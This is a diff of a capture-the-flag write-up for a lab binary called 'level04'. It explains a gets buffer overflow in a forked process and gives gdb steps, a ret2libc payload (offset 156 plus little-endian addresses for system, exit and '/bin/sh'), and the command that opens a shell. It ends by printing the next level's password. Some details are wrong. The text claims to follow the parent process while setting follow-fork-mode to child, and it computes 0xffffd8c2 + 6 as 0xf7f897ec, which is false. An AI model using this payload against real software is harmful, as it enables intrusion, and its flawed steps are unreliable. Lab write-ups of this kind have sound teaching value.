@@ -1,7 +1,70 @@
-python -c "print 'a' * 156 + '\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7'"
+We've started executing the binary to see what was asking.
+
+It asked some shellcode.
+
+Disassembling with gdb we noticed that the fork function was used an that there
+was a gets to take the input and it was vulnerable. The issue was that the gets was in
+in the parent process and executing level04 normally we entered directly in the child.
+
+So we launched gdb with an option to follow the parent process
+
+gdb level04
+
+set follow-fork-mode child
+
+now we used a buffer oveflow pattern to obtain the segfault address
+
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1994]
+0x41326641 in ?? ()
+
+using the address of the segv we got that the offset is 156.
+
+Now we follow the steps to build our usual payload:
+
+Find the addresses of system, exit and /bin/sh in the libc
+
+info functions system
+0xf7e6aed0  system
+
+info functions exit
+0xf7e5eb70  exit
+
+to find /bin/sh we need to print the env variables and search for the SHELL one
+
+x/s 500 $esp
+
+(gdb) x/s 0xffffd8c2
+0xffffd8c2:	 "SHELL=/bin/bash"
+
+once found the address we add 6 to remove the "SHELL="
+0xffffd8c2 + 6 = 0xf7f897ec
+
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+
+Now we can build the payload for the exploit.
+
+We convert the addresses to little endian
 
 system		= 0xf7e6aed0 <=> \xd0\xae\xe6\xf7
 exit		= 0xf7e5eb70 <=> \x70\xeb\xe5\xf7
 "/bin/sh"	= 0xf7f897ec <=> \xec\x97\xf8\xf7
 
 \xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7
+
+We store the shellcode into a tmp file since we have to open a shell using cat.
+
+python -c "print 'a' * 156 + '\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7'" > /tmp/level04
+
+cat /tmp/level04 - | ./level04
+
+Give me some shellcode, k
+whoami
+level05
+
+cat ~level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
